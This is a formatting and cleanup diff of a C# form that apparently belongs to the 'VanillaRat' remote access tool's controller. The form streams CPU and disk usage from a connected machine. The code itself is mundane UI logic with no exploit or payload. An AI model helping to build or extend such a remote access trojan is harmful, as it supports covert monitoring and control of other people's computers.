@@ -1,12 +1,5 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
 using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace VanillaRat.Forms
@@ -17,7 +10,9 @@ namespace VanillaRat.Forms
         {
             InitializeComponent();
         }
+
         public int ConnectionID { get; set; }
+
         private void btnStart_Click(object sender, EventArgs e)
         {
             Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StartUsageStream"));
@@ -25,7 +20,7 @@ namespace VanillaRat.Forms
 
         private void btnStop_Click(object sender, EventArgs e)
         {
-            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StopUsageStream"));            
+            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StopUsageStream"));
         }
 
         private void txtCpuUsage_TextChanged(object sender, EventArgs e)
@@ -37,12 +32,14 @@ namespace VanillaRat.Forms
                     pbUsage.Value = 0;
                 if (pbUsage.Value > IntegerValue)
                 {
-                    pbUsage.Value = pbUsage.Value - IntegerValue; 
-                } else
-                {
-                    pbUsage.Value = pbUsage.Value + IntegerValue; 
+                    pbUsage.Value = pbUsage.Value - IntegerValue;
                 }
-            } catch { }
+                else
+                {
+                    pbUsage.Value = pbUsage.Value + IntegerValue;
+                }
+            }
+            catch { }
         }
 
         private void txtDiskUsage_TextChanged(object sender, EventArgs e)
@@ -54,13 +51,14 @@ namespace VanillaRat.Forms
                     pbDiskUsage.Value = 0;
                 if (pbDiskUsage.Value > IntegerValue)
                 {
-                    pbDiskUsage.Value = pbDiskUsage.Value - IntegerValue; 
+                    pbDiskUsage.Value = pbDiskUsage.Value - IntegerValue;
                 }
                 else
                 {
                     pbDiskUsage.Value = pbDiskUsage.Value + IntegerValue;
                 }
-            } catch { }
+            }
+            catch { }
         }
 
         private void txtAvailableRam_TextChanged(object sender, EventArgs e)
